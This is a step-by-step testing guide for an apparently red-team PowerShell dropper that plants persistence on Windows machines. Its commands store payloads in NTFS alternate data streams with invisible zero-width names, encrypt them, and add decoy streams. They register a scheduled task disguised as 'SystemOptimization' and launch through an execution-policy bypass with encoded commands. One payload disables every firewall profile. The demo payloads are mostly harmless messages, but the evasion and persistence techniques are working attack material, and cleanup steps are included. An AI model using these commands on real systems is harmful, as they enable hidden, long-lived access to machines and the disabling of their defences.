Quick Testing Guide - ADS-OneLiner.ps1
======================================

### ⚡ Immediate Testing Steps
---
```bash
# Create test directory

mkdir ads-test

cd ads-test

# Run simplest test

# either cd to the directory with ADS-Dropper.ps1 and ADS-OneLiner.ps1 (../src), or copy said two files into your current working directory


pwsh ./ADS-OneLiner.ps1 -Payload "Write-Host 'Hello from ADS!' -ForegroundColor Green" -OutputFile ../ads-test/test-basic.txt
```

## Expected Output:

╔═══════════════════════════════════════════════════════════╗

║ ADS Minimal Command Generator                             ║

╚═══════════════════════════════════════════════════════════╝

[*] Using ADS-Dropper: ./ADS-Dropper.ps1

[*] Generating configuration...

[+] Configuration computed

    Host: C:\ProgramData\SystemCache.dat

    Stream: [char]0x...

    Task: SystemOptimization

[*] Building minimal deployment commands...

[*] Saving manifest...

[+] Manifest saved to: ./manifests/manifest-20260201-143000.json

[*] Generating output formats...

╔═══════════════════════════════════════════════════════════╗

║ SUMMARY                                                   ║

╚═══════════════════════════════════════════════════════════╝

✓ Minimal commands generated

✓ Output saved to: test-basic.txt

✓ Manifest saved for recovery

READY TO DEPLOY!

Copy-paste to Windows target and execute.

* * * * *

### Verify Output File

```bash

# Check output file was created

ls -lh test-basic.txt

# View the file

cat test-basic.txt
```

Should Contain:

1.  Configuration section

2.  OPTION 1: Base64 encoded command

3.  OPTION 2: Readable commands

4.  Usage instructions

5.  Cleanup commands

* * * * *

### Step 4: Verify Manifest

```bash

# Check manifest directory

ls -lh manifests/

# View manifest

cat manifests/manifest-*.json | jq
```

Should Contain:

-   Timestamp

-   HostPath

-   StreamName

-   Codepoints

-   TaskName

-   PayloadHash

-   etc.

* * * * *

### Test Zero-Width Mode

```bash

pwsh ADS-OneLiner.ps1 -Payload "Write-Host '🎀 Zero-width test!' -ForegroundColor Magenta" -ZeroWidthStreams -ZeroWidthMode single -OutputFile test-zerowidth.txt
```

Expected:

-   Stream name should show [char]0x200B or similar

-   Codepoints in manifest: U+200B (or other zero-width char)

* * * * *

### Test Encryption

```bash
pwsh ADS-OneLiner.ps1 -Payload "Write-Host 'Encrypted test!' -ForegroundColor Cyan" -Encrypt -OutputFile test-encrypted.txt
```

Expected:

-   Output should include Get-HostKey, Enc, Dec functions

-   Manifest should show "Encrypted": true

* * * * *

### Test Decoys

```bash
pwsh ADS-OneLiner.ps1 -Payload "Write-Host 'Decoy test!'" -CreateDecoys 3 -OutputFile test-decoys.txt
```

Expected:

-   Output should include lines creating Zone.Identifier, Summary, Comments

-   Manifest should show "DecoysCount": 3

* * * * *

### Test Runtime Payload

```bash
pwsh ADS-OneLiner.ps1 -PayloadAtDeployment -Persist task -OutputFile test-runtime.txt
```

Expected:

-   Output should include Read-Host logic

-   No manifest created (payload unknown at generation time)

-   Message: "No manifest created (payload unknown at generation)"

* * * * *

🎯 Test Your Full Suite
-----------------------

ADS Testing Suite - Comprehensive Verification
==============================================

Purpose: Verify all functionality works as expected\
Test Environments: Linux VM (Kali) + Windows VM (testing target)\
Payload Theme: Cute & cheeky red team aesthetics 🎀💀

* * * * *

🎯 Test Overview
----------------

We'll test 5 scenarios that mirror real red team usage:

1.  Basic Stealth Persistence - Simple zero-width with task

2.  C2 Beacon Simulation - Encrypted callback with decoys

3.  Service Manipulation - Firewall down + service stop

4.  Multi-Stage Deployment - Runtime payload with hybrid mode

5.  Memeware Persistence - Fun payload for morale 😈

* * * * *

🧪 Test 1: Basic Stealth Persistence
------------------------------------

Red Team Use Case: Initial foothold with minimal detection

### On Linux (Kali)

bash

# Create test directory

mkdir -p ~/ads-testing

cd ~/ads-testing

# Test 1: Basic zero-width persistence (remove the while($true){} if desire is to show only once briefly)

pwsh ADS-OneLiner.ps1

-Payload 'while($true){Write-Host "🎀 Pwned with love! ~(˘▾˘~)" -ForegroundColor Magenta; Start-Sleep 2}'

  -ZeroWidthMode single

  -Persist task

  -OutputFile test1-basic.txt

```

**Expected Output:**

```

✓ Deployment payload generated

✓ Output saved to: test1-basic.txt

✓ Manifest saved to: ./manifests

Verify on Linux:

bash

# Check output file exists

ls -lh test1-basic.txt

# Check manifest created

ls -lh manifests/

# View manifest codepoints

cat manifests/manifest-*.json |  grep -i "codepoints"

# Verify base64 one-liner present

grep  "EncodedCommand" test1-basic.txt

### On Windows VM

powershell

# Copy OPTION 1 from test1-basic.txt and paste:

powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand <paste_base64_here>

# Expected: Cute message appears, task is created

```

**Expected Windows Output:** (Deployment complete text wont show with the while loop)

```

🎀 Pwned with love! ~(˘▾˘~)

[+] Deployment complete

Verification Commands (Windows):

powershell

# 1. Check if ADS was created

Get-Item C:\ProgramData\SystemCache.dat -Stream * | Where-Object { $_.Stream -ne  ':$DATA' }

# Expected: Shows stream (appears blank if zero-width)

# 2. Verify stream is invisible in dir

cmd /c "dir /r C:\ProgramData\SystemCache.dat"

# Expected: Stream name appears blank

# 3. Check scheduled task created

Get-ScheduledTask  -TaskName "SystemOptimization" | Format-List  *

# Expected: Task exists, action contains powershell

# 4. Verify task executes payload after reboot

# (Reboot VM, then check)

Restart-Computer

# After reboot, check if cute message appeared at logon

Pass Criteria:

-   ✅ Output file created on Linux

-   ✅ Manifest saved with codepoints

-   ✅ Base64 one-liner executes on Windows

-   ✅ Cute message displays

-   ✅ ADS created (shows blank stream name)

-   ✅ Scheduled task created

-   ✅ Payload executes after reboot

* * * * *

🧪 Test 2: C2 Beacon Simulation (Encrypted)
-------------------------------------------

Red Team Use Case: Persistent encrypted beacon with decoys

### On Linux (Kali)

bash

cd ~/ads-testing

# Test 2: Encrypted C2 beacon with decoys

pwsh ADS-OneLiner.ps1

-Payload 'while($true){Write-Host "💀 [C2] Heartbeat from $(hostname) @ $(Get-Date -Format HH:mm:ss)" -ForegroundColor Cyan; Start-Sleep 30; if((Get-Random -Max 100) -gt 95){break}}'

  -ZeroWidthMode hybrid

-HybridPrefix "Zone.Identifier"

-CreateDecoys 3

  -Encrypt

  -Persist task

  -OutputFile test2-c2beacon.txt

# Expected: Creates encrypted payload with decoys

Verify on Linux:

bash

# Verify encryption flag in manifest

cat manifests/manifest-*.json | jq '.Encrypted'

# Expected: true

# Verify decoys count

cat manifests/manifest-*.json | jq '.DecoysCount'

# Expected: 3

# Check hybrid prefix

cat manifests/manifest-*.json | jq '.HybridPrefix'

# Expected: "Zone.Identifier"

### On Windows VM

powershell

# Paste OPTION 1 from test2-c2beacon.txt

powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand <paste_here>

# Expected: C2 heartbeat messages appear every 30 seconds

```

**Expected Windows Output:**

```

💀 [C2] Heartbeat from WIN-VM @ 14:30:15

💀 [C2] Heartbeat from WIN-VM @ 14:30:45

💀 [C2] Heartbeat from WIN-VM @ 14:31:15

...

[+] Deployment complete

Verification Commands (Windows):

powershell

# 1. Check for decoy streams

Get-Item C:\ProgramData\SystemCache.dat -Stream * | Format-Table Stream, Length

# Expected: Shows Zone.Identifier (decoy), Summary (decoy), Comments (decoy), and blank (payload)

# 2. Verify decoy content is benign

Get-Content C:\ProgramData\SystemCache.dat:Zone.Identifier

# Expected: [ZoneTransfer] ZoneId=3 (or similar benign content)

# 3. Try to read encrypted payload stream

# First, get the stream name from Linux manifest codepoints

$codepoints = 'U+005A U+006F U+006E U+0065 U+002E ...' # From manifest

function  ConvertFrom-Codepoints {

    param([string]$Codepoints)

    $points = $Codepoints  -split '\s+' | ForEach-Object {

        $cleaned = $_  -replace  '^(U\+|0x)', ''

        [int]"0x$cleaned"

    }

    -join ($points | ForEach-Object { [char]$_ })

}

$streamName = ConvertFrom-Codepoints  -Codepoints $codepoints

Get-Content  "C:\ProgramData\SystemCache.dat:$streamName"  -Raw

# Expected: Base64 encrypted string (not readable plaintext)

# 4. Verify encryption by checking content doesn't contain obvious keywords

$content = Get-Content  "C:\ProgramData\SystemCache.dat:$streamName"  -Raw

$content  -match  "Write-Host"

# Expected: False (content is encrypted)

Pass Criteria:

-   ✅ Encrypted payload generates on Linux

-   ✅ Decoys flag in manifest = 3

-   ✅ C2 beacon messages appear on Windows

-   ✅ 3 decoy streams created (Zone.Identifier, Summary, Comments)

-   ✅ Decoy content is benign

-   ✅ Payload stream is encrypted (base64, no plaintext)

-   ✅ Scheduled task created

* * * * *

🧪 Test 3: Service Manipulation (Firewall Down)
-----------------------------------------------

Red Team Use Case: Disable scored services, drop firewall for C2 access

### On Linux (Kali)

bash

cd ~/ads-testing

# Test 3: Service manipulation payload (I don't have a while loop on this, and no persistence by default as the test. FAFO at your own risk)

pwsh ADS-OneLiner.ps1

-Payload 'Write-Host "🔥 [Red Team] Firewall manipulation starting..." -ForegroundColor Red; try { Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False; Write-Host "✓ Firewall disabled! uwu" -ForegroundColor Green } catch { Write-Host "✗ Firewall disable failed (need admin)" -ForegroundColor Yellow }; Write-Host "🎯 Service enumeration:" -ForegroundColor Cyan; Get-Service | Where-Object {$_.Status -eq "Running" -and $_.DisplayName -match "Windows Defender|Firewall|Update"} | Select-Object DisplayName, Status | Format-Table'

  -ZeroWidthMode multi

  -Persist none

  -OutputFile test3-firewall.txt

# Note: Persist = none for one-time execution test

### On Windows VM (As Admin)

powershell

# Paste OPTION 1 from test3-firewall.txt

# MUST RUN AS ADMINISTRATOR

powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand <paste_here>

# Expected: Firewall disabled, services listed

```

**Expected Windows Output:**

```

🔥 [Red Team] Firewall manipulation starting...

✓ Firewall disabled! uwu

🎯 Service enumeration:

DisplayName                              Status

----------- ------

Windows Defender Firewall                Running

Windows Defender Antivirus Service       Running

Windows Update                           Running

[+] Deployment complete

Verification Commands (Windows):

powershell

# 1. Check firewall status

Get-NetFirewallProfile | Select-Object Name, Enabled

# Expected: All profiles should show Enabled = False

# 2. Verify no ADS created (Persist = none)

Test-Path C:\ProgramData\SystemCache.dat

# Expected: False (file shouldn't exist since Persist = none)

# 3. Verify no scheduled task created

Get-ScheduledTask  -TaskName "SystemOptimization"  -ErrorAction SilentlyContinue

# Expected: $null (task shouldn't exist)

# 4. Re-enable firewall (cleanup)

Set-NetFirewallProfile  -Profile Domain,Public,Private -Enabled True

Pass Criteria:

-   ✅ Payload executes successfully

-   ✅ Firewall gets disabled (when run as admin)

-   ✅ Running services enumerated

-   ✅ Cute messages display

-   ✅ No ADS created (Persist = none)

-   ✅ No scheduled task created

-   ✅ Firewall can be re-enabled

* * * * *

🧪 Test 4: Multi-Stage Deployment (Runtime Payload)
---------------------------------------------------

Red Team Use Case: Flexible deployment where payload is chosen at execution time

### On Linux (Kali)

bash

cd ~/ads-testing

# Test 4: Runtime payload input

pwsh ADS-OneLiner.ps1

  -PayloadAtDeployment

  -ZeroWidthMode hybrid

-HybridPrefix "Summary"

-CreateDecoys 2

  -Persist task

  -OutputFile test4-runtime.txt

# Note: No -Payload, uses -PayloadAtDeployment instead

Verify on Linux:

bash

# Check that manifest was NOT created (since payload not known at generation)

ls manifests/ |  wc -l

# Should be same count as before (no new manifest for runtime payload)

# Verify output contains "Enter payload" prompt instruction

grep -i "enter" test4-runtime.txt

### On Windows VM

powershell

# Paste OPTION 2 from test4-runtime.txt (readable version recommended for runtime)

# Copy entire OPTION 2 section and paste

# When prompted:

Enter payload: Write-Host  "✨ [Multi-Stage] Payload deployed at runtime! (｡♥‿♥｡)"  -ForegroundColor Magenta; Get-Process | Where-Object {$_.ProcessName -match  "powershell|cmd"} | Select-Object ProcessName, Id, StartTime

# Press Enter twice to finish input

```

**Expected Windows Output:**

```

✨ [Multi-Stage] Payload deployed at runtime! (｡♥‿♥｡)

ProcessName  Id  StartTime

----------- -- ---------

powershell   1234  1/29/2026 2:30:15 PM

powershell   5678  1/29/2026 2:35:42 PM

[+] Deployment complete

Verification Commands (Windows):

powershell

# 1. Verify ADS created with Summary prefix

Get-Item C:\ProgramData\SystemCache.dat -Stream * | Where-Object { $_.Stream -match  "Summary" }

# Expected: Shows stream starting with "Summary" (rest is zero-width)

# 2. Check decoys

Get-Item C:\ProgramData\SystemCache.dat -Stream * | Measure-Object

# Expected: Count should include Summary[zw], Zone.Identifier, Comments (3 total + :$DATA)

# 3. Verify task created

Get-ScheduledTask  -TaskName "SystemOptimization"

# Expected: Task exists

# 4. Read back payload from ADS to verify it was stored correctly

# (Get stream name from previous command, then read)

$streams = Get-Item C:\ProgramData\SystemCache.dat -Stream *

$payloadStream = $streams | Where-Object { $_.Stream -match  "Summary" } | Select-Object  -First 1

Get-Content  "C:\ProgramData\SystemCache.dat:$($payloadStream.Stream)"  -Raw

# Expected: Shows your runtime payload

Pass Criteria:

-   ✅ Runtime payload option generates on Linux

-   ✅ No manifest created (payload unknown at generation)

-   ✅ Windows prompts for payload input

-   ✅ Runtime payload executes correctly

-   ✅ ADS created with hybrid Summary prefix

-   ✅ Decoys created (2 decoy streams)

-   ✅ Scheduled task created

-   ✅ Payload stored correctly in ADS

* * * * *

🧪 Test 5: Memeware Persistence (Fun Payload)
---------------------------------------------

Red Team Use Case: Maintaining access with humor for team morale 😈

### On Linux (Kali)

bash

cd ~/ads-testing

# Test 5: Memeware - ASCII art + motivational messages

pwsh ADS-OneLiner.ps1 -Payload 'Clear-Host; $cat = @"
    /\_/\  
   ( o.o ) 
    > ^ <  
  Red Team Kitty says:
  Your persistence is purrfect! 
  Keep those shells alive! ฅ^•ﻌ•^ฅ
"@; Write-Host $cat -ForegroundColor Magenta; Write-Host ""; Write-Host "[Status] Backdoor active since $(Get-Date)" -ForegroundColor Cyan; Write-Host "[Access] $env:COMPUTERNAME\$env:USERNAME" -ForegroundColor Green; $motd = @("Remember to clear your tracks! 🐾","Pwn responsibly! 💕","Stay hydrated, hack harder! 💧","The best exploits are the friends we made along the way! ✨","Red team life: Break things, look cute doing it! 🎀") | Get-Random; Write-Host "[MOTD] $motd" -ForegroundColor Yellow; Write-Host ""; Write-Host "Press Ctrl+C to exit..." -ForegroundColor DarkGray; while($true){Start-Sleep 1}' \
  -ZeroWidthMode single \
  -CreateDecoys 4 \
  -Randomize \
  -Encrypt \
  -Persist task \
  -OutputFile test5-memeware.txt

Verify on Linux:

bash

# Check randomization was enabled

cat manifests/manifest-*.json | jq -r '.GeneratedFrom'  |  tail -1

grep -i "randomize" manifests/manifest-*.json

# Check decoys count = 4

cat manifests/manifest-*.json | jq '.DecoysCount'  |  tail -1

### On Windows VM

powershell

# Paste OPTION 1 from test5-memeware.txt

powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand <paste_here>

# Expected: Cute cat ASCII art with motivational message

```

**Expected Windows Output:** (on restart or new login)

```

    /\_/\  
   ( o.o ) 
    > ^ <  

  Red Team Kitty says:
  Your persistence is purrfect! 
  Keep those shells alive! ฅ^-ﻌ-^ฅ
[Status] Backdoor active since 1/29/2026 2:45:30 PM
[Access] WIN-VM\Administrator
[MOTD] Pwn responsibly! 💕


Verification Commands (Windows):

powershell

# 1. Check if host file has randomized name

Get-ChildItem C:\ProgramData\*.dat | Select-Object Name

# Expected: Random filename (not SystemCache.dat)

# Example: XjKmPqWz.dat

# 2. Count ADS streams (should have 4 decoys + 1 payload)

Get-Item C:\ProgramData\*.dat -Stream * | Measure-Object

# Expected: 6 total (4 decoys + 1 payload + :$DATA)

# 3. Verify all decoy streams

Get-Item C:\ProgramData\*.dat -Stream * |

  Where-Object { $_.Stream -ne  ':$DATA' } |

  Select-Object Stream, Length

# Expected: Shows Zone.Identifier, Summary, Comments, Author, and blank (payload)

# 4. Trigger task manually to see memeware

Start-ScheduledTask  -TaskName "SystemOptimization"

Start-Sleep 2

# Expected: Cat appears again with different motivational message (randomized)

# 5. Verify encryption

$randomFile = (Get-ChildItem C:\ProgramData\*.dat).FullName

$streams = Get-Item  $randomFile  -Stream *

$payloadStream = $streams | Where-Object { $_.Stream -ne  ':$DATA'  -and  $_.Stream -notmatch  'Zone|Summary|Comments|Author' } | Select-Object  -First 1

$content = Get-Content  "$randomFile`:$($payloadStream.Stream)"  -Raw

$content.Substring(0, 50)

# Expected: Base64 encrypted string, not ASCII art

Pass Criteria:

-   ✅ Memeware payload generates

-   ✅ Cute ASCII art displays

-   ✅ Motivational message appears (randomized)

-   ✅ Host file has randomized name

-   ✅ 4 decoy streams created

-   ✅ Payload is encrypted

-   ✅ Scheduled task created

-   ✅ Task execution shows different random message each time

* * * * *

🧹 Cleanup Verification Test
----------------------------

Purpose: Verify recovery and cleanup procedures work correctly

### On Linux (Kali)

bash

cd ~/ads-testing

# Get codepoints from manifests for cleanup

echo  "=== Cleanup Information ==="

for  manifest  in manifests/*.json; do

  echo  "Manifest: $manifest"

  cat  "$manifest"  | jq -r '.Codepoints'

  echo  ""

done

### On Windows VM

powershell

# Cleanup Test Script

Write-Host  "=== ADS Cleanup Test ==="  -ForegroundColor Cyan

# Define ConvertFrom-Codepoints function

function  ConvertFrom-Codepoints {

    param([string]$Codepoints)

    $points = $Codepoints  -split '\s+' | ForEach-Object {

        $cleaned = $_  -replace  '^(U\+|0x)', ''

        [int]"0x$cleaned"

    }

    -join ($points | ForEach-Object { [char]$_ })

}

# Paste codepoints from each Linux manifest

$test1_codepoints = 'U+200B' # Example - replace with actual

$test2_codepoints = 'U+005A U+006F...' # Example - replace with actual

# Test 1 cleanup

Write-Host  "[Test 1] Cleaning up basic persistence..."  -ForegroundColor Yellow

$sn1 = ConvertFrom-Codepoints  -Codepoints $test1_codepoints

Remove-Item  "C:\ProgramData\SystemCache.dat:$sn1"  -Force -ErrorAction SilentlyContinue

Write-Host  "✓ Stream removed"  -ForegroundColor Green

# Test 2 cleanup

Write-Host  "[Test 2] Cleaning up C2 beacon..."  -ForegroundColor Yellow

$sn2 = ConvertFrom-Codepoints  -Codepoints $test2_codepoints

Remove-Item  "C:\ProgramData\SystemCache.dat:$sn2"  -Force -ErrorAction SilentlyContinue

# Remove decoys

Remove-Item  "C:\ProgramData\SystemCache.dat:Zone.Identifier"  -Force -ErrorAction SilentlyContinue

Remove-Item  "C:\ProgramData\SystemCache.dat:Summary"  -Force -ErrorAction SilentlyContinue

Remove-Item  "C:\ProgramData\SystemCache.dat:Comments"  -Force -ErrorAction SilentlyContinue

Write-Host  "✓ Streams and decoys removed"  -ForegroundColor Green

# Test 4 cleanup (runtime payload)

Write-Host  "[Test 4] Cleaning up runtime payload..."  -ForegroundColor Yellow

$test4streams = Get-Item C:\ProgramData\SystemCache.dat -Stream *  -ErrorAction SilentlyContinue | 

  Where-Object { $_.Stream -match  "Summary" }

foreach ($s in $test4streams) {

    Remove-Item  "C:\ProgramData\SystemCache.dat:$($s.Stream)"  -Force -ErrorAction SilentlyContinue

}

Write-Host  "✓ Runtime payload streams removed"  -ForegroundColor Green

# Test 5 cleanup (randomized file)

Write-Host  "[Test 5] Cleaning up memeware..."  -ForegroundColor Yellow

$randomFile = Get-ChildItem C:\ProgramData\*.dat -ErrorAction SilentlyContinue

if ($randomFile) {

    Remove-Item  $randomFile.FullName -Force -ErrorAction SilentlyContinue

    Write-Host  "✓ Randomized file removed: $($randomFile.Name)"  -ForegroundColor Green

}

# Remove all SystemCache.dat files

Write-Host  "[General] Removing host files..."  -ForegroundColor Yellow

Remove-Item C:\ProgramData\SystemCache.dat -Force -ErrorAction SilentlyContinue

Write-Host  "✓ Host files removed"  -ForegroundColor Green

# Remove scheduled tasks

Write-Host  "[Tasks] Removing scheduled tasks..."  -ForegroundColor Yellow

Unregister-ScheduledTask  -TaskName "SystemOptimization"  -Confirm:$false  -ErrorAction SilentlyContinue

Write-Host  "✓ Scheduled tasks removed"  -ForegroundColor Green

# Final verification

Write-Host  "`n=== Verification ==="  -ForegroundColor Cyan

$remaining = Get-ChildItem C:\ProgramData\*.dat -ErrorAction SilentlyContinue

if (-not  $remaining) {

    Write-Host  "✓ All ADS host files removed"  -ForegroundColor Green

} else {

    Write-Host  "⚠ Some files remain:"  -ForegroundColor Yellow

    $remaining | Select-Object Name, Length

}

$tasks = Get-ScheduledTask  -TaskName "SystemOptimization"  -ErrorAction SilentlyContinue

if (-not  $tasks) {

    Write-Host  "✓ All scheduled tasks removed"  -ForegroundColor Green

} else {

    Write-Host  "⚠ Tasks still exist"  -ForegroundColor Yellow

}

Write-Host  "`n=== Cleanup Complete! ==="  -ForegroundColor Green

Pass Criteria:

-   ✅ All stream names recoverable from codepoints

-   ✅ All ADS removed successfully

-   ✅ All decoy streams removed

-   ✅ All host files removed

-   ✅ All scheduled tasks removed

-   ✅ No artifacts remaining

* * * * *

📋 Master Test Checklist
------------------------

### Linux VM Tests

-   ✅ PowerShell Core (pwsh) installed and working

-   ✅ Build-ADSOneLiner.ps1 runs without errors

-   ✅ Test 1: Basic output file created

-   ✅ Test 2: Encrypted payload with decoys generated

-   ✅ Test 3: Service manipulation payload generated

-   ✅ Test 4: Runtime payload option generated

-   ✅ Test 5: Memeware with randomization generated

-   ✅ All manifests created in ./manifests/

-   ✅ All manifest files contain correct codepoints

-   ✅ All output files contain both OPTION 1 and OPTION 2

### Windows VM Tests

-   ✅ Test 1: Basic persistence executes, cute message displays

-   ✅ Test 1: Zero-width stream created (appears blank)

-   ✅ Test 1: Scheduled task created

-   ✅ Test 1: Payload executes after reboot

-   ✅ Test 2: C2 beacon displays heartbeat messages

-   ✅ Test 2: 3 decoy streams created

-   ✅ Test 2: Payload is encrypted (not readable plaintext)

-   ✅ Test 3: Firewall disabled (when run as admin)

-   ✅ Test 3: No ADS created (Persist = none)

-   ✅ Test 4: Runtime payload prompt works

-   ✅ Test 4: Runtime payload executes correctly

-   ✅ Test 4: Hybrid mode with Summary prefix works

-   ✅ Test 5: Memeware displays cute ASCII art

-   ✅ Test 5: Randomized host filename created

-   ✅ Test 5: 4 decoy streams created

-   ✅ Test 5: Motivational messages randomize

### Cleanup Tests

-   ✅ All codepoints recoverable from Linux manifests

-   ✅ ConvertFrom-Codepoints function works

-   ✅ All ADS removable

-   ✅ All decoys removable

-   ✅ All host files removable

-   ✅ All scheduled tasks removable

-   ✅ No artifacts remain after cleanup

* * * * *

🎓 Success Criteria
-------------------

All tests pass if:

1.  ✅ All 5 payloads generate successfully on Linux

2.  ✅ All manifests created with correct data

3.  ✅ All 5 payloads execute successfully on Windows

4.  ✅ All expected features work (encryption, decoys, zero-width, randomization)

5.  ✅ All cute messages display correctly

6.  ✅ All cleanup procedures work

7.  ✅ No errors or exceptions during any test

Final Verdict: PASS / FAIL

* * * * *

🎀 Bonus: Combined Super Payload
--------------------------------

If all individual tests pass, try this ultimate combo:

bash

# On Linux - The Ultimate Cute Red Team Payload

pwsh ADS-OneLiner.ps1

-Payload 'Write-Host "💖✨🎀 ULTIMATE RED TEAM DEPLOYMENT 🎀✨💖" -ForegroundColor Magenta; $banner = @"

     ∧＿∧

    (｡･ω･｡)つ━☆・*。

  ⊂　 ノ 　　　・゜+.

   しーＪ　　　°。+ *'¨)

  Red Team Mode: ACTIVATED ✓

  Persistence: MAXIMUM 

  Cuteness: OVERWHELMING

"@; Write-Host $banner -ForegroundColor Cyan; Write-Host "[💀] Firewall disabled" -ForegroundColor Red; Write-Host "[🔓] Backdoor established" -ForegroundColor Yellow; Write-Host "[📡] C2 beacon active" -ForegroundColor Green; Write-Host "[🎯] Target: $env:COMPUTERNAME" -ForegroundColor Magenta; Write-Host "[😈] Have a purrfect day! ฅ^-ﻌ-^ฅ" -ForegroundColor Cyan'

  -ZeroWidthMode hybrid

-HybridPrefix "Zone.Identifier"

-CreateDecoys 5

  -Encrypt

  -Randomize

  -Persist task

  -OutputFile ultimate-cute-payload.txt

Expected: The most adorable persistence mechanism ever deployed! 🎀💀

* * * * *

Remember: These are harmless test payloads for verification purposes only!

Happy testing! (｡♥‿♥｡) 🎀💀✨
